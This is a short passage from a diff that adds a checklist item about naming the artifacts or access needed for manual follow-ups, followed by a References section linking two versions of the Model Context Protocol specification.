+- [ ] Manual follow-ups name the exact artifact or access needed.
+
+## References
+
+- [MCP specification 2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26)
+- [MCP specification 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)
